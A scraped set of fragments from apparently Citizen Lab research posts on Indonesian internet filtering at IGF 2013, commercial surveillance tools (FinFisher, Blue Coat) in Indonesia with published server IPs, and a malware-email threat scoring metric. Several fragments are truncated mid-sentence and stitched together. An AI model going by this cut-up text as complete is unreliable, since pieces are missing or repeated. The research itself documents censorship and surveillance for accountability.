GHgz)\nAS: IGF2013-ID Internet Governance Forum 2013\nNetalzyer Results\nTesting on the SSID IGF2013 (AS: IGF2013-ID Internet Governance Forum 2013) showed no evidence of filtering out of the 1,387 URLs tested. Organizers described this network as offering unfettered access as per the UN host agreement, and our technical testing verified this claim.\nSSID: IGF2013@wifi.id\nAS: TELKOMNET-AS2-AP PT Telekomunikasi Indonesia\nNetalyzer Results\nTesting on the SSID IGF2013@wifi.id (AS TELKOMNET-AS2-AP PT) found 197 URLs blocked out of the sample of 1,387 URLs tested through DNS tampering. A variety of content was blocked, including LGBT content, independent media sites, critical religious content, and circumvention and anonymizer tools. A full list of blocked URLs can be found here.\nAll blocked content resolved to the IP address 118.98.97.100. Users were redirected to a block page hosted at www.internet-positif.org, like this response to an HTTP GET request:\nHTTP/1.1 307\nServer: nginx\nDate: Mon, 21 Oct 2013 10:22:31 GMT\nContent-Type: text/html\nTransfer-Encoding: chunked\nConnection: close\nCache-Control: no-cache\nLocation: href=”http://internet-positif.org/site.block?\nUpon redirection, the block page shown in Figure 11 was served to users.\nFigure 11. Trust+ Positif blockpage observed on the SSID: IGF2013@wifi.id\nThe text on the block page reads:\n“This forbidden site cannot be accessed because it is indicated that it may contain one of the following: Pornography, Gambling, Phising [sic], SARA [SARA stands for “Suku, Agama, Ras, Antar-golongan,” which refers to content related to ethnicity, religion, race, and intergroup relations], or PROXY. If you feel that this site is not included in any of the aforementioned categories, please contact advankonten [at] depkominfo [dot] go [dot] id.”\nThe Trust+ Positif block page serves a number of advertisements hosted on third-party sites. Figure 12 shows the HTTP gets to different domains required when you visit the block page once.\nFigure 12. HTTP transactions from a visit to http://internet-positif.org. Image taken from http://urlquery.net/report.php?id=7114070\nTests of website accessibility on this network were also undertaken by independent researcher Collin Anderson, who collaborated with us on the research for this post. Anderson performed a DNS consistency test with OONI-probe against the Alexa top 1 million URL list. Based on those results, Anderson extracted the domains that pointed to the filtering server. He then scripted a retrieval of the OpenDNS assessments on every filtered domain and extracted community categorizations for each. The results of these tests can be found here and the distribution of blocked URLs in each primary category can be seen in Figure 13.\nFigure 13. Alexa 200,000 top URLs blocked on SSID IGF2013@wifi.id per primary OpenDNS categorization.\nDuring the IGF, the website for Freegate (www.internetfreedom.org), a circumvention tool, was found to be filtered on this network. On 21 October at 4:00 pm, a conference attendee notified network administrators about this blocked website, and by 11:00 pm the site was made accessible. The prompt response by network administrators and the ISP is an example of remediation for potentially erroneous blocking, but also demonstrates an informal ad-hoc process.\nISP: IGF2013@Indosat\n AS: INDOSATM2-ID\nNetalyzer Results\nTesting conducted on SSID: IGF2103@indosat (AS: INDOSATM2-ID) found 164 URLs blocked out of the sample of 1,387 URLs tested. These websites include LGBT content, independent media sites, critical religious content, gambling websites, and pornography. Websites found blocked included Free Speech TV (www.freespeech.org), Equal Marriage for Same-Sex Couples (www.samesexmarriage.ca), and the Indonesian religious site Faith Freedom (indonesia.faithfreedom.org/doc). The full list of URLs blocked on this ISP can be found here.\nThis ISP filters by DNS tampering, with all filtered domains resolving to the IP 124.81.92.132. After being redirected to this IP, users are served the block page seen in Figure 14.\n \nFigure 14. Blockpage observed on SSID IGF2013@Indosat\nThis block page has the following HTML source:\n<html>\n<body>\n<center>\n<p>\n<hr>\n<font face=”arial” size=”15″ color=”black”>\n<b>Access Restricted by</b>\n<p>\n<img src=”logo_netsafe.JPG” alt=”netSAFE”></img>\n<p>&nbsp;\n<font size=”4″>\nVersi 1.0 beta\n<hr>\n<p>&nbsp;\nCopyright (c) 2011 INDOSAT group\n</body>\n</html>\nCross-ISP Comparison\nIndonesia’s highly decentralized filtering environment means that what content is filtered and how filtering is implemented can vary greatly between ISPs. Our results do show such a variation in filtering, although there is a general overlap in the types of content filtered. Our test results show that pornography, a putative focus of the filtering regime, is highly filtered on all ISPs, as is nonpornographic LGBT content. One notable area of difference is anonymizers and circumvention tools, which are heavily filtered on Telkmonet’s IGF network while generally available on the other two networks.\nA breakdown of the variation in filtered content between ISPs can be seen in Figure 15.\nFigure 15. Proportion of tested URLs found blocked on each ISP, sorted by URL content category\nFigure 16 shows the variation and overlap in blocked content between the three ISPs.\nFigure 16. Venn diagram of number of URLs blocked between three ISPs, grouped by content category\nSummary and Next Steps\nThe research and analysis presented here shows that an understanding of content controls requires a combination of methods and insights from both technical and qualitative approaches, and in particular perspectives from those who understand the social, political, cultural, and economic context of Indonesia. It is clear from the data we collected and the analysis we undertook that Indonesian content controls are exercised in a way that is inconsistent, lacks transparency, and includes numerous instances of overblocking, or blocking of content far beyond what is publicly justified and discussed. Some of this overblocking is the consequence of categorization errors; others appear to be the result of overzealous compliance by ISPs; and still others may be the result of other factors, including subtle pressure and influence by government officials or other parties. As Indonesian development in ICTs continues to rapidly progress, the lack of transparency, accountability, and clear processes for content controls will likely exacerbate tensions and disputes in the country among stakeholders operating in an uncertain environment.\nData\nCompleted lists of URLs used for testing, and URLs found blocked through both remote and client-based tests can be found here:\n\n\nGoogle Doc version\n\nCSVs\n\nIGF2013@wifi.id URLs found blocked through in-country testing\nIGF2013@wifi.id URLs found blocked through OONI-probe testing\nIndonesiaIGF2013-IGF2013@Indosat-incountry.csv\nIndonesiaIGF2013-Nawala-dns.csv\nIndonesiaIGF2013-Tri-incountry.csv\nIndonesiaIGF2013-Global List.csv\nIndonesiaIGF2013-Indonesia local list.csv\n\n\n\n \n\n\t\t\t\t\n\t\t\t",

Governments and private companies engage in surveillance for a wide range of reasons, many of them beneficial for society. However, surveillance can also be used to target dissidents and undermine privacy. If surveillance is undertaken without proper accountability, it can lead to the abuse of power. Surveillance of the Internet and other communications is now a huge growth industry, with many companies supplying governments with passive and targeted surveillance products and services.\nCitizen Lab research has documented the use of surveillance technologies, products, and services in Indonesia, including those designed for or capable of targeted (FinFisher) and passive (Blue Coat) surveillance. Additionally, smartphone maker BlackBerry (previously known as Research in Motion) has come under pressure from Indonesian authorities to locate back-end infrastructure within the country as a means of facilitating surveillance of users. BlackBerry, as well as other electronic service providers, has continued to be pressed by the Indonesian government to locate their data centres in Indonesia, in line with the government regulation 82 of 2012 on the Operation of Electronic Systems and Transactions.\nThis post summarizes Citizen Lab’s prior research on surveillance in Indonesia, including documented evidence of FinFisher command-and-control servers and Blue Coat Systems devices on IPs owned by Indonesian ISPs. It also identifies recent trends in Indonesian surveillance practices, laws, and regulations that provide potential avenues for further research.\nPrior Research: Censorship and Surveillance in Indonesia\nFinFisher\nCitizen Lab research has documented the use of surveillance technologies, products, and services in Indonesia. Since 2012, Citizen Lab researchers have revealed the presence of FinFisher command-and-control (C2) servers in thirty-six countries across the globe, including Indonesia. These findings have led to activists and advocacy groups in several countries launching legal complaints in national and international settings, including in Pakistan, Mexico, the United Kingdom, and the OECD. We have translated a “fact sheet” about our findings from English to Malay and Indonesian.\nFinFisher is a commercial surveillance toolkit that provides an attacker with remote control and access over a target’s computer system. According to leaked promotional materials, FinSpy, a component of the FinFisher suite, is capable of exfiltrating data; intercepting e-mail, instant messaging, and VoIP communications; and spying on users through webcams and microphones. Captured information is then transmitted to a designated FinSpy C2 server. FinFisher is developed by Munich-based Gamma International GmbH. The UK-based Gamma Group advertises FinFisher as a suite of “governmental IT intrusion and remote monitoring solutions” and claims to sell exclusively to law enforcement and intelligence agencies.\nIn August 2012, Citizen Lab published The Smartphone Who Loved Me, in which researchers identified potential FinSpy C2 servers in ten countries by scanning IP addresses and fingerprinting for FinSpy’s characteristic C2 protocol. Among the observed servers was an IP (112.78.143.26) owned by Biznet, an Indonesian ISP. Martin Muench, the managing director of Gamma Group, publicly denied that the scanned servers were connected to any component of the FinFisher suite.\nIn a March 2013 follow-up report titled You Only Click Twice, Citizen Lab identified thirty-six FinSpy servers (thirty new, six previously identified) in nineteen different countries, many of which have a history of human rights violations. The report documented four additional C2 servers in Indonesia on three IPs belonging to ISPs Biznet (112.78.143.34), PT Matrixnet Global (103.38.xxx.xxx), and PT Telkom (118.97.xxx.xxx). During the course of this research, we found mobile-related evidence with a specific connection to Indonesia that is significant and deserves further scrutiny. The FinFisher product for mobile phones can send stolen data back using SMS messages. We found one sample of a mobile phone version of FinFisher that contained a phone number in Indonesia, which the spyware used to send stolen data back over SMS.\nOur researchers did not know who was targeted with this particular sample, but infer that the people who were targeted were likely in Indonesia because the SMS number was there. Usually there is a charge for sending international text messages, which is levied by the telecom company that a user subscribes to. If charges for sending international text messages begin to appear on a phone bill, and the target knows they did not send those messages, they may become suspicious. Our researchers inferred from this reasoning that the use of an Indonesian phone number indicates that there are people in Indonesia who are targeted with FinFisher. The phone number we identified in the FinFisher sample was:\n+6281310xxxxx4 – Indonesia\nAlthough these findings have raised alarms among activists and media, it’s important to be clear about several contextual points. The presence of FinFisher C2 server in a particular country is not necessarily proof that the government is responsible for purchasing or operating the FinFisher suite. Someone could be operating the C2 server from another jurisdiction, and using the location to mask attribution. Moreover, there are legitimate ends to which law enforcement and other government agencies might employ the FinFisher toolkit, such as legally “wiretapping” suspected criminals (i.e., with a judicial warrant). However, products used by law enforcement and government agencies for “lawful interception” become problematic in countries with weak rule of law and where dissident activities are viewed as criminal, or where military and intelligence agencies have a track record of targeting local populations or civil society. For example, the Citizen Lab has found evidence of FinFisher being used to target Bahraini activists as well as evidence of FinFisher campaigns with political content relevant to Ethiopia and Malaysia.\nIn response to Citizen Lab’s findings, a spokesperson for Indonesia’s Ministry of Communications and Information Technology (MCIT) stated that the ministry would evaluate the information and take “decisive action” if Biznet, PT Telkom, and other ISPs were operating surveillance software. The ministry further stated that any such act would constitute a violation of article 40 of Indonesia’s Telecommunications Act, which explicitly prohibits unlawful eavesdropping on information transmitted over telecommunications networks. The implication that the ISPs themselves were responsible for the purchase of FinFisher software contradicts Gamma Group’s claim to sell only to governmental entities.\nBlue Coat\nBlue Coat Systems is a California-based provider of network security and optimization appliances with functionality permitting network filtering and surveillance. These include: ProxySG devices that work with WebFilter, which categorizes Web pages to permit filtering of unwanted content; PacketShaper, a cloud-based networking management device that can establish visibility of over six hundred web applications and control undesirable traffic; and CacheFlow, a Web-caching appliance that functions to optimize bandwidth. ProxySG provides “SSL Inspection” services to solve “issues with intercepting SSL for your end-users.” PacketShaper has the ability to monitor and control network traffic: it is integrated with WebPulse, Blue Coat Systems’ real-time network intelligence service that can filter application traffic by content category. CacheFlow can be configured to block content. While these Blue Coat products can be used to maintain and secure networks, they can also be used to implement politically motivated restrictions on access to information, and monitor and record private communications.\nThe Citizen Lab has conducted research on Blue Coat Systems products using a combination of wide-area scanning techniques, Shodan queries, and other experimental methods. Citizen Lab researchers have found Blue Coat devices on the public networks of eighty-three countries (twenty countries with both ProxySG and PacketShaper, fifty-six countries with PacketShaper only, and seven countries with ProxySG only).\nIn a January 2013 report titled Planet Blue Coat: Mapping Global Censorship and Surveillance Tools, Citizen Lab discovered PacketShaper installations in Indonesia on the networks of both Indosat (http://202.155.63.62/) and PT Telkom (http://203.130.193.156/login.htm). The Citizen Lab also found installations of CacheFlow on PT Telkom (http://180.252.181.1). Citizen Lab researchers connected to the Blue Coat devices to confirm that they were active.\nThe presence of Blue Coat devices in a country does not necessarily imply that they are being deployed for surveillance. However, their presence raises substantial concerns, particularly in light of Citizen Lab finding FinFisher on three Indonesian ISPs as well as governmental pressure exerted on BlackBerry to locate its back-end servers within the country as a means of facilitating surveillance of users. Additional concerns revolve around the lack of rigorous independent oversight for Indonesia’s State Intelligence Agency (Badan Intelijen Negara, BIN). In light of these findings and this context, further investigation is required.\nBlue Coat Systems offers product certification courses through a number of “Authorized Training Centers,” such as Red Education. Headquartered in North Sydney, Australia, Red Education offers courses on information technology and computer networking, and has training centres across the globe including in Jakarta. The company offers training courses in PacketShaper and ProxySG administration, as well as certification exams for Blue Coat proxy administrators and professionals.\nTrends in Surveillance and Further Issues for Research\nBlackBerry\nIndonesia is a significant market for Canadian telecommunications company and smartphone manufacturer BlackBerry Ltd. As of 2013, analysts estimated that approximately 15 million BlackBerry users are in Indonesia, accounting for almost 20 percent of all BlackBerry consumers worldwide.\nIn a multistakeholder meeting in January 2011, BlackBerry agreed to comply with four demands the Indonesian government stipulated, including the creation of domestic after-sales service centres, the establishment of network aggregators or servers on Indonesian soil, the implementation of government censorship requirements for Internet content, and an agreement to discuss the possibility of granting Indonesian law enforcement “lawful interception access” to key BlackBerry services. BlackBerry implemented the government’s filtering requirements, established forty service centers, and claimed to have fulfilled the “lawful interception” condition (i.e., will provide access to its network if a violation occurs) through coordination with Indonesia’s Corruption Eradication Commission, but the company did not disclose further details about its implementation.\nDespite BlackBerry’s claims, the Indonesian Telecommunications Regulatory Body (Badan Regulasi Telekomunikasi Indonesia, BRTI) filed a complaint against the company for locating a key data centre in Singapore rather than Indonesia as requested. The BRTI threatened to shut down BlackBerry Messenger (BBM) and BlackBerry Internet Service (BIS), claiming that the use of servers in Canada to process BBM and BIS data threatened the security of Indonesian users. The Indonesian government has also argued that local servers are necessary for monitoring criminals and terrorists using the BlackBerry platform for communications.\nIndonesia’s requirement to locate servers within its borders reflects a trend BlackBerry encountered when it began operating in countries with significant controls over information. Concerns over monitoring citizens’ communications have prompted the governments of Saudi Arabia and the United Arab Emirates to make similar demands of the company. Saudi Arabia and the United Arab Emirates also threatened to ban BlackBerry data and messaging services due to alleged security concerns. As with Saudi Arabia and the United Arab Emirates, Indonesia is facing the challenge of controlling information on devices whose traffic is processed outside of its jurisdiction. During an open discussion held by the Indonesian E-commerce Association (IdEA) in May 2013 in Jakarta, MCIT’s Director General of Informatics Application, Ashwin Sasongko, said, “If the data centers are located overseas and there are issues, (Indonesian) law enforcement will face problems in getting to the data. Law enforcers cannot gain physical access because it’s in another country.” As of 2013, BlackBerry has not yet built a server inside Indonesia.\nGamma TSE\nIndonesia’s military establishment has bolstered its surveillance capabilities through international partnerships and commercial purchases. From 2006 to 2008, the US government provided a USD 57 million outlay to Indonesia for the establishment of an Integrated Maritime Surveillance System (IMSS), designed to combat terrorism, smuggling, and piracy in Indonesian waters. The system includes surveillance cameras, surface radar, global position systems, and other combinations of sensors, devices, and technical platforms to monitor maritime traffic.\nThe Indonesian military recently purchased “unspecified ‘wiretapping’ equipment” from Gamma TSE. The undisclosed equipment will be used by the TNI’s Strategic Intelligence Agency. Privacy International described this deal as “deeply troubling” given the Gamma Group’s previous commercial deals with authoritarian regimes and the Indonesian military’s history of human rights violations. Members of Indonesia’s House of Representatives also expressed concern that surveillance equipment could be abused in the run-up to the 2014 general election. The House Commission on Defense and Information warned the military not to use any purchased equipment for politically motivated surveillance.\nLegal Environment and Surveillance\nAs we mentioned in our Infrastructure and Governance post, there are many laws that regulate interception and wiretapping in Indonesia. Figure 1 shows that at least twelve laws, two government regulations, and two ministerial regulations outline the practice of wiretapping by state institutions in the name of law enforcement. This is because communication interceptions today are usually carried out by law enforcement agencies to expose crimes, particularly organized and transnational crimes. In many of these cases, wiretapping was helpful, even necessary. However, they are also prone to misuse and may lead to violations of privacy without comprehensive legislation regulating their use.\nIn January 2013, Gatot S. Dewa Broto, the spokesperson for the MCIT, stated that the government as a whole is preparing a draft law on interception mechanisms (RUU Tata Cara Intersepsi).\n\nFigure 1. Various acts and regulations governing interception and wiretapping1\nHowever, prior to the attention the Constitutional Court generated by annulling article 31(4) in the Electronic Information and Transactions Act, the debate about interception was stirred by the enactment of Act No. 17 Year 2011 on State Intelligence, which was widely criticized for granting broader authority, and not enough accountability, to the State Intelligence Agency to intercept communications. The Alliance of Independent Journalists, four nongovernmental organizations, and thirteen individuals subsequently filed a judicial review of the act at the Constitutional Court in Jakarta in January 2012. They were concerned with its vague and broadly defined articles, for instance, on the issue of “intelligence secrets,” and the opportunity that it provides authorities to classify public information as state intelligence. These provisions imperil journalists because using or citing documents that had been classified could be deemed a crime. Certain articles also evoked fears of surveillance by “Big Brother,” such as article 29 which gives the State Intelligence Agency power over foreigners or foreign institutions planning to take Indonesian citizenship, or visit, work, study, or open a representative office in the country. In October 2012, the Constitutional Court turned down the judicial review, arguing that the act “appropriately regulated intelligence practices in Indonesia.”\nThe State Intelligence Law is one of at least nine laws that allows the authorities to conduct surveillance or wiretapping, and although a court order is required in most cases, there are concerns that permission will be granted too easily due to limits on judicial independence. Furthermore, surveillance techniques are most often deployed in Indonesia for combatting terrorism, but there is inadequate oversight or checks and balances in place to prevent abuse by those who are conducting the monitoring. The only other law that explicitly states the need for judicial oversight is the Law on Narcotics, but the requisite procedures for that oversight remain unclear\nAreas for Further Research\nSurveillance is an unavoidable characteristic of cyberspace. The use of sophisticated data mining and analytical tools that collect, mine, and isolate network traffic has spread quickly. Likewise, the market for enhanced surveillance products and services has become a major and growing commercial segment.\nOur research on Indonesia is not uncharacteristic of what we’ve seen in other countries today: the government faces urgent public policy issues around cybercrime, national security issues involving insurgencies, regional tensions, and omnipresent concerns about acts of terror. Not surprisingly, we would expect the government to develop or acquire advanced signals intelligence, computer network exploitation, and surveillance capabilities. At the same time, because of many technological systems’ “dual-use” nature, we should not be surprised to find evidence of such technologies making their way into ISPs and telecommunication companies, and even the private businesses who use them for increasingly complex challenges of network management.\nKey to this discussion will be the question of oversight, accountability, and transparency around surveillance — particularly surveillance involving government intelligence and law enforcement agencies. As findings emerge of products that can be used or repurposed to put civil society and others at risk, it is imperative that research is directed toward clarifying their end uses. Further research is clearly required to this end in Indonesia.\nFootnote:\n1 Sinta Dewi Rosadi, Privacy International Draft Report, 2013, p.4.\n\n\t\t\t\t\n\t\t\t",

This approach, however, is not only a concern for political reasons, especially for civil liberties, but also for digital security and foreign policy reasons. Deibert suggests that law enforcement and intelligence agencies should instead seek to work within the information-rich world of Big Data that provides us with any access to private communications made exceptional, and strictly controlled by lawful procedures and oversight mechanisms.\nRead the full report here.\n \n  \n\n\t\t\t\t\n\t\t\t",

The main theme of this year’s IGF was “Building Bridges: Enhancing Multistakeholder Cooperation for Growth and Sustainable Development.”\nThis post is the first in a series that explores online freedom of expression and the state of information controls in Indonesia in the context of its role as host of the IGF, comparing Indonesia’s information controls with similar practices in the region, the rest of the world, and in events similar to the IGF. We also analyze how these practices are driven by Indonesia’s social, political, and cultural context, and the role that international norms play in influencing information controls.\nMajor global events are frequently a focal point for the exercise of and contests over information control, including Internet censorship and surveillance, disruptions to mobile and other communications systems, and tampering with Internet connectivity. Such information controls are often highly dynamic, responding to the changing situation on the ground when information can have the greatest impact. We call such practices “just-in-time” information controls — denying, disrupting, manipulating, or monitoring access to information during important political moments.1 High-profile global events can have significant political, social, and economic consequences for host countries, and may come with new security and surveillance measures as a result.2\nSeveral Citizen Lab researchers and associates who attended the IGF participated in the research for these posts, including those who have been situated in Indonesia for some time as part of the civil society stakeholder preparations for the 2013 IGF. Additionally, we are capitalizing on the expertise and input of Indonesian colleagues, including those who are part of the Cyber Stewards Network,3 to provide much-needed context and nuance around the analysis presented here. We are also mindful of others who are attending the IGF and are engaging in their own separate monitoring activities, and intend to reference their work as much as possible and when appropriate. Citizen Lab staff working remotely will be providing input into and support for network measurement and legal and policy analysis to provide much-needed context and nuance around the analysis presented here. We are also mindful of others who attended the IGF and are engaging in their own separate monitoring activities, and intend to reference their work as much as possible and when appropriate. Citizen Lab staff working remotely provided input into and support for network measurement and legal and policy analysis.\nWe frame our analysis with the following topics and questions:\nInfrastructure and Governance\nThe application of information controls in a country is highly influenced by the domestic political, economic, and social context in which they are applied. Each country’s communication infrastructure is unique, differentiated by factors such as the number of Internet service providers (ISPs), telecommunication companies, the degree of market competition among them, and the overall level of Internet penetration and growth. In some countries numerous ISPs and a highly competitive market environment can act as a constraint on state-driven information controls, whereas in other countries with fewer ISPs and less democratic regimes, state regulations can be more centrally implemented and sometimes more constraining. International connectivity and upstream arrangements with peers can also shape the nature of information controls, as do regional and international governance regimes of which the country may be a member. Most importantly, the regime type of the country in question can have a major influence over the nature of information controls.\nThe Indonesian government has traditionally been supportive of ICT development. Internet penetration has increased since the beginning of the century, from less than 1 percent in 2000 to 15.36 percent in 2012. Cellular phone penetration has increased at an exponential rate over the same time period, from 1.72 to 115.20 cellular phone subscriptions per 100 inhabitants from 2000 to 2012. The government is planning to increase basic telephone services to thousands of villages across the country and is trying to increase Internet penetration to the country’s easternmost islands.\nIndonesia has over 250 ISPs. The two largest telecommunications operators, PT Telekom and PT Indosat, were partially privatized in the mid-1990s after years of state control, although the government continues to own shares in both companies. As ICT penetration in Indonesia has increased, so have the regulations and laws, some having the perceived necessities of dealing with growing cybercrime issues as their impetus while others have to do with content controls. ISPs and telecommunications companies have voiced their concerns that these laws lack clarity and may place burdens on their services.4\nOur post examines the following questions:\n\nHow is cyberspace constituted in Indonesia?\n\n\nWhat is the political economy of Internet governance and use in the country?\n\n\nHow are laws and regulations over the Internet implemented?\n\n\nWhat autonomy do ISPs have to implement laws and rules, and what practices inform implementation of controls in Indonesia? How do these practices compare to other countries?\n\n\nIs the Indonesian government developing a cyber-security strategy? What policies does it include, and how will these affect information controls? How have issues of cybercrime been perceived in Indonesia and what have been the institutional and legal responses?\n\n\nDoes the Indonesian government have a “regional” or “foreign policy” for cyberspace?\n\nRead the post.\nContent Controls\nInformation controls involve control over what content is accessible to a population, including information posted online. Content controls can include laws and regulations that restrict free speech online or in certain media, as well as technical measures designed to limit access to information — otherwise known as “Internet filtering.” Since 2003, the Citizen Lab, as a founding member of the OpenNet Initiative,5 has tested Internet filtering in seventy-four countries, and found that forty-two of these seventy-four countries engage in some form of content filtering. The type of content being filtered varies across countries, and depends on local political, legal, social, and cultural contexts. We employ a multidisciplinary approach that includes technical testing of government-mandated Internet censorship policies and practices, field research by regional and country-level experts, as well as analysis of the country’s legal and regulatory filtering framework. The combination of technical investigation with political, social, and legal contextual work is essential for understanding both how and why information controls are applied.6 We also aim to determine the specific techniques and, where possible, which products are used to implement Internet content filtering.\nOpenNet Initiative testing in 2010 on four Indonesian ISPs found that pornographic content, which is illegal under the country’s 2008 Anti-Pornography Law, is heavily filtered. Testing also revealed that Internet filtering across ISPs is unsystematic and inconsistent, with some ISPs blocking more than others and targeting a wider range of content such as anonymizer and circumvention websites, and websites containing controversial political or religious content. In 2011, smartphone maker BlackBerry began censoring pornographic content on their networks in the country following demands by the Indonesian government.\nOur research on content controls is guided by the following questions:\n\nWhat content controls are applied in Indonesia?\n\n\nHow are those content controls implemented or carried out?\n\n\nWhat do network measurements of Internet accessibility reveal about the scope, scale, and character of information controls in Indonesia?\n\n\nWhat restrictions are placed on free expression, both off and online, in Indonesia?\n\n\nWhat steps have civil society groups taken in response?\n\n\nWhat Internet users, if any, have been targeted for arrest and on what grounds?\n\nRead the post.\nSurveillance and Control\nSurveillance is one of the most effective, if less obvious, forms of information control. Governments and private companies engage in surveillance for a wide range of reasons, many of them beneficial for society. For example, surveillance is an essential component of government responses to health crises and natural emergencies, and is a critical component of effective large-scale network management and law enforcement. However, surveillance can also be used to target dissidents and undermine privacy. If surveillance is undertaken without proper accountability, it can lead to the abuse of power. Surveillance of the Internet and other communications is now a huge growth industry, with many companies supplying governments with passive and targeted surveillance products and services.\nPast Citizen Lab research has documented the use of surveillance technologies, products, and services in Indonesia. For example, command-and-control servers for the commercial malware product FinFisher were identified on the Indonesian ISPs PT Telkom, PT Matrixnet Global, and Biznet, as were devices that can be used for filtering and surveillance which were manufactured by the US-headquartered Blue Coat Systems. Indonesia’s Ministry of Defence recently signed a USD 6.7 million contract with Gamma TSE to provide undisclosed “wiretapping equipment” for use by the ministry’s Strategic Intelligence Agency. Gamma TSE is part of the Gamma Group, which includes Gamma Group International, the developer of FinFisher, a “lawful interception” product.\nSmartphone maker BlackBerry has come under pressure from Indonesian authorities to locate infrastructure within the country as a means of facilitating surveillance of users, although it is not clear what, if any, arrangements have been made between the company and the Indonesian government.\n\nWhat type of surveillance is undertaken by Indonesian authorities?\n\n\nWhat oversight and accountability is associated with that monitoring?\n\n\nWhat range of equipment, products, services, etc., does Indonesia use to implement surveillance? And how is that surveillance targeted?\n\n\nWere any special security and surveillance measures been taken for the IGF? And if so, what type of surveillance, and for what purpose?\n\nRead the post.\nIGF Controls\nMajor global events like the IGF are often a significant focus of international attention and can have important political, economic, and social consequences for host countries. Information controls are customarily loosened during the hosting of the IGF event — particularly at the venue itself. The 2005 World Summit on the Information Society (WSIS) in Tunis, for example, provided unfettered access within the conference venue, while filtering remained in place elsewhere in the country.\nCitizen Lab staff and associates have participated in every IGF since the first meeting was held in Athens in 2006 (as well as the WSIS meetings that preceded it in 2003 and 2005). At the 2005 WSIS meeting in Tunis, Citizen Lab researcher Nart Villeneuve’s presentation on Internet filtering was disrupted by Tunisian authorities and nearly cancelled. Our participation in the 2009 IGF in Egypt included having our book launch for the OpenNet Initiative’s Access Controlled disrupted by United Nations’ officials, following complaints by  Chinese government representatives concerning our reference to Tibet and the Great Firewall of China in our published material.\nOur last post focuses on the dynamics surrounding the IGF itself:\n\nWhat were the interests of the various Indonesian stakeholders (government, private sector, civil society) in hosting the IGF? What did different stakeholders hope to accomplish? Where did these interests clash? What value does the Indonesian government place in the IGF relative to other international forums, such as ICANN, the ITU, or non-cyberspace-related forums like APEC and ASEAN?\n\n\nTo what extent were Indonesian stakeholders able to influence and shape the agenda and outcomes of the IGF? How did they prepare for the meeting, and what were the obstacles to overcome in making it happen (e.g., budgetary issues)?\n\n\nWhat impact did the forum have, if any, on Indonesian information controls and related practices?\n\n\nHow did Internet accessibility in the forum’s venue, or in any other area where attendees congregated (i.e., hotels, Internet cafés, etc.), compare to what the average Indonesian user experiences?\n\n\nHow did stakeholders in Indonesia organize themselves to host the IGF?\n\n\nWhat were the political dynamics of the IGF meeting itself?\n\n\nWhat were the processes to develop the agenda and program for the meeting — e.g., how did the multistakeholder advisory committee develop the key topics, agenda, and structures of the IGF? Which stakeholders held which positions, and who had input?\n\n\nWhat were the outcomes?\n\nRead the post.\nFootnotes\n1 For more background on “just-in-time” content controls, see Masashi Crete-Nishihata and Jillian C.

    "text": "\n\t\t\t\tDownload PDF version\nIntroduction\nThe Targeted Threat Index is a metric for assigning an overall threat ranking score to email messages that deliver malware to a victim’s computer. The TTI metric was first introduced at SecTor 2013 by Seth Hardy as part of the talk “RATastrophe: Monitoring a Malware Menagerie” along with Katie Kleemola and Greg Wiseman.\nIn Citizen Lab’s ongoing analysis of targeted attacks against human rights organizations, we have seen a wide range of threats varying in level of both social engineering and technical complexity. While other scoring systems exist for the purpose of communicating the level of severity and danger of a vulnerability, no common system exists for ranking the sophistication of targeted email attacks. This gap is likely because evaluating the sophistication of the targeting is non-technical, and can’t be automated due to the requirement of a strong familiarity with the underlying subject material.\nThe TTI score is calculated by taking a base value determined by the sophistication of the targeting method, which is then multiplied by a value for the technical sophistication of the attachment. The base score can be used independently to compare emails, and the combined score gives an indication of how much work an attacker is putting into individual threats.\nThe TTI score is intended for use in prioritizing the analysis of incoming threats, as well as for getting an overall idea of how severely an organization is threatened.\nTTI Metric\nThe TTI score is calculated in two parts:\n(Targeting Sophistication Base Value) * (Technical Sophistication Multiplier) = TTI Score\nFor targeted threats, final TTI scores range from 1 to 10, where 10 is the most sophisticated attack. Scores of 0 are reserved for threats that are not targeted, even if they are malicious. For example, spam using an attached PDF or XLS to bypass anti-spam filters, and highly sophisticated financially motivated malware, would both score 0.\nTargeting Sophistication – Base Value\nThe base value of the score ranges from 0 to 5, based on the sophistication of the email’s social engineering techniques used to get the victim to open the attachment. This score considers the content and presentation of the message as well as the claimed sender identity. This determination also includes the content of any associated files; many times malware is injected into legitimate relevant documents.\n\n\n\nValue\nDescription\n\n\n0\nNot targeted, e.g. spam or financially motivated\nmalware.\n\n\n1\n\nTargeted but not customized. Sent with a message that is\nobviously false with little to no validation required.\n\n\n\n2\nTargeted and poorly customized. Content is generally\nrelevant to the target. May look questionable.\n\n\n3\nTargeted and customized. May use a real\nperson/organization or content to convince the target the message is\nlegitimate. Content is specifically relevant to the target and looks\nlegitimate.\n\n\n4\nTargeted and well-customized. Uses a real\nperson/organization and content to convince the target the message is\nlegitimate. Probably directly addressing the recipient. Content is specifically\nrelevant to the target, looks legitimate, and can be externally referenced\n(e.g. by a website). May be sent from a hacked account.\n\n\n5\nTargeted and highly customized using sensitive data.\nIndividually targeted and customized, likely using inside/sensitive information\nthat is directly relevant to the target.\n\n\n\nTable 1: TTI Base Value Score\nHigher scores rely on detailed knowledge of personal details about the recipient and their field, including trust networks between organizations. Among the highest scoring emails include those sent with insider knowledge from internal business meetings, strongly suggesting that someone within the organization has already been compromised. Slightly lower scoring emails have included one organization in our study receiving information claiming to be from another participating organization – members of either organization would be able to immediately identify the email as suspicious.\nTechnical Sophistication – Multiplier\nThe technical sophistication score is a multiplier ranging from 1 to 2 based on how advanced the associated malware is, including malicious file attachments as well as links to malware hosted on another system. We use a multiplier because advanced malware requires significantly more effort and time (or money, in the case of commercial solutions) to custom-tune for a particular target.\nIn this section, “associated malware” refers to the payload of the malware, and not to the exploit used to get it on the victim’s computer. Malware features that increase the sophistication may not reduce detection by AV (anti virus) software if used alongside an old exploit or one that is easy to detect. Likewise, a 0-day exploit may be used to carry malware that is easily picked up by a desktop AV scanner, although this is very unlikely. AV detection rates are not directly tied to technical sophistication, and should not be used to determine multiplier value without analysis of the underlying code.\n\n\n\nValue\nDescription\n\n\n1\nThe sample contains no code protection such as packing,\nobfuscation (e.g. simple rotation of C2 names or other interesting strings), or\nanti-reversing tricks.\n\n\n1.25\nThe sample contains a simple method of protection, such as\none of the following: code protection using publicly available tools where the\nreverse method is available, such as UPX packing; simple anti-reversing\ntechniques such as not using import tables, or a call to IsDebuggerPresent();\nself-disabling in the presence of AV software.\n\n\n1.5\nThe sample contains multiple minor code protection\ntechniques (anti-reversing tricks, packing, VM / reversing tools detection)\nthat require some low-level knowledge. This level includes malware where code\nthat contains the core functionality of the program is decrypted only in\nmemory.\n\n\n1.75\nThe sample 